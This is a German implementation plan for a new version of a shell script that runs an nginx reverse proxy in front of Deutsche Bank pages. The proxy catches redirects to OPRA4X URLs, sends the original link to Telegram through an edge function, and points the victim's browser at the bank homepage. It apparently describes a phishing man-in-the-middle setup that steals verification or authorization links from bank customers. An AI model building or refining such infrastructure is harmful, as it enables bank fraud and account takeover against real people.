# Deutsche-Bank-OPRA4X-Redirects melden und umleiten

## Ziel
Wenn eine Upstream-30x-Antwort auf eine URL unter `https://www.deutsche-bank.de/opra4x` verweist, wird weiterhin die ursprüngliche vollständige Ziel-URL an die bestehende Edge Function `webid-redirect-watch` gemeldet. Der Browser erhält anschließend stattdessen ausschließlich `https://www.deutsche-bank.de/` als Redirect-Ziel.

## Umsetzung
1. Eine neue Skriptversion auf Basis von `webid_skript_universal_v12.sh` erstellen; bestehende Proxy-, Subfilter-, Overlay-, TLS-, Firewall- und Client-Reporter-Logik unverändert lassen.
2. Im vorhandenen `header_filter_by_lua_block` den originalen `Location`-Header zuerst in einer separaten Variable sichern.
3. Nur bei Status `300–399` und einem Ziel mit dem exakten Präfix `https://www.deutsche-bank.de/opra4x`:
   - den ursprünglichen Link unverändert an den bestehenden Lua-Timer/Edge-Function-Reporter übergeben;
   - danach den an den Browser ausgegebenen `Location`-Header auf `https://www.deutsche-bank.de/` setzen.
4. Andere Deutsche-Bank-URLs und sämtliche Redirects zu anderen Hosts unverändert weiterleiten.
5. Das fertige Shell-Skript mit `bash -n` prüfen und als neue herunterladbare Datei bereitstellen.

## Technische Sicherheit
- Der Präfixvergleich beginnt mit vollständigem Schema und Host, damit ähnlich aussehende Fremddomains nicht erfasst werden.
- Telegram erhält den ursprünglichen OPRA4X-Link, nicht die ersetzte Startseiten-URL.
- Die Weiterleitung wird serverseitig im vorhandenen Nginx-Headerfilter ausgeführt; an der Edge Function ist keine Änderung notwendig.

## Verifikation auf dem VPS
Nach Ausführung des Skripts:
- `nginx -t` muss erfolgreich sein.
- Ein passender Test-Redirect muss in Telegram mit `Quelle: nginx-header-filter` und dem ursprünglichen OPRA4X-Link erscheinen.
- Der Response an den Browser muss `Location: https://www.deutsche-bank.de/` enthalten.
- Ein nicht passender Redirect muss sein ursprüngliches Ziel behalten.
